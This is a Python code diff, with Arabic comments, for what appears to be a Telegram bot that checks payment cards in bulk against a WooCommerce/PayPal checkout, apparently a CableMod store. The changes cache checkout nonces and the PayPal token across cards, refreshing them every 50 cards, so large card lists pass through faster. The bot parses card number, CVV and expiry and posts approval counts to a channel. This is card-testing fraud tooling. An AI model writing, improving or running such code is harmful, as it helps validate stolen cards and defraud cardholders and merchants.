@@ -156,8 +156,13 @@ def parse_card(card_str: str) -> Tuple[str, str, str, str]:
         raise ValueError(f"الشهر غير صحيح: {month}")
     return number, cvv, year, month
 
-# ====== فئة معالجة الدفع ======
+# ====== فئة معالجة الدفع (مع تحسين لمشاركة البيانات) ======
 class WooCommercePayPal:
+    shared_nonces = {}
+    shared_paypal_token = None
+    shared_update_counter = 0
+    UPDATE_INTERVAL = 50  # تحديث كل 50 بطاقة
+
     def __init__(self):
         self.sess = requests.Session()
         self.sess.cookies.update(INITIAL_COOKIES)
@@ -167,7 +172,21 @@ class WooCommercePayPal:
         self.paypal_token = None
         self.paypal_order_id = None
         self.client_metadata_id = None
-        
+        self._load_shared_data()
+
+    def _load_shared_data(self):
+        if WooCommercePayPal.shared_nonces:
+            self.nonces = WooCommercePayPal.shared_nonces.copy()
+        if WooCommercePayPal.shared_paypal_token:
+            self.paypal_token = WooCommercePayPal.shared_paypal_token
+
+    def _save_shared_data(self):
+        WooCommercePayPal.shared_nonces = self.nonces.copy()
+        WooCommercePayPal.shared_paypal_token = self.paypal_token
+
+    def _needs_update(self):
+        return WooCommercePayPal.shared_update_counter % self.UPDATE_INTERVAL == 0
+
     def headers_get(self):
         return {
             "user-agent": UA,
@@ -175,7 +194,7 @@ class WooCommercePayPal:
             "accept-language": "ar,en-US;q=0.9,en;q=0.8",
             "referer": BASE_URL + "cart/",
         }
-    
+
     def headers_ajax(self, json_content=False):
         h = {
             "user-agent": UA,
@@ -187,15 +206,18 @@ class WooCommercePayPal:
         }
         h["content-type"] = "application/json" if json_content else "application/x-www-form-urlencoded; charset=UTF-8"
         return h
-    
-    def step1_get_checkout(self):
+
+    def step1_get_checkout(self, force=False):
+        if not force and self.nonces.get("update_order_review_nonce"):
+            return  # استخدام المشترك إذا موجود
         r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
         r.raise_for_status()
         self.nonces = extract_nonces(r.text)
         if not self.nonces.get("update_order_review_nonce"):
             raise Exception("فشل في استخراج update_order_review_nonce")
+        self._save_shared_data()
         return r.text
-    
+
     def step2_update_order_review(self):
         post_data = {
             "wc_order_attribution_source_type": "organic",
@@ -222,8 +244,10 @@ class WooCommercePayPal:
             return r.json()
         except:
             return None
-    
-    def step3_get_paypal_token(self):
+
+    def step3_get_paypal_token(self, force=False):
+        if not force and self.paypal_token:
+            return self.paypal_token  # استخدام المشترك إذا موجود
         html = self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text
         fresh_nonces = extract_nonces(html)
         if fresh_nonces.get("ppcp_nonce"):
@@ -280,10 +304,11 @@ class WooCommercePayPal:
                 except:
                     pass
             self.paypal_token = result
+            self._save_shared_data()
             return result
         except:
             raise
-    
+
     def step4_create_paypal_order(self):
         max_retries = 3
         for attempt in range(1, max_retries + 1):
@@ -377,7 +402,7 @@ class WooCommercePayPal:
                 raise Exception("Failed to create order")
         except:
             raise
-    
+
     def step5_confirm_payment(self, card_number: str, cvv: str, year: str, month: str):
         access_token = None
         if isinstance(self.paypal_token, dict):
@@ -443,7 +468,7 @@ class WooCommercePayPal:
             return result, payer_action_link
         except:
             raise
-    
+
     def step6_3ds_verification(self):
         headers = {
             'accept': '*/*',
@@ -483,16 +508,18 @@ async def check_card(card: str, bot_app):
         card_number, cvv, year, month = parse_card(card)
         masked_card = f"{card_number[:6]}******{card_number[-4:]}"
         processor = WooCommercePayPal()
-        processor.step1_get_checkout()
+        force_update = processor._needs_update()
+        processor.step1_get_checkout(force=force_update)
         await asyncio.sleep(0.5)
         processor.step2_update_order_review()
         await asyncio.sleep(0.5)
-        processor.step3_get_paypal_token()
+        processor.step3_get_paypal_token(force=force_update)
         await asyncio.sleep(0.5)
         processor.step4_create_paypal_order()
         await asyncio.sleep(0.5)
         payment_result, payer_action_link = processor.step5_confirm_payment(card_number, cvv, year, month)
         status = payment_result.get("status", "UNKNOWN")
+        WooCommercePayPal.shared_update_counter += 1
         if status in ("APPROVED", "COMPLETED"):
             stats['approved'] += 1
             stats['checking'] -= 1
@@ -761,6 +788,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'is_running': True,
         'chat_id': update.effective_chat.id
     })
+    WooCommercePayPal.shared_update_counter = 0  # إعادة تهيئة العداد
     dashboard_msg = await context.application.bot.send_message(
         chat_id=CHANNEL_ID,
         text="**CABLEMOD + PAYPAL CHECKER - LIVE**",
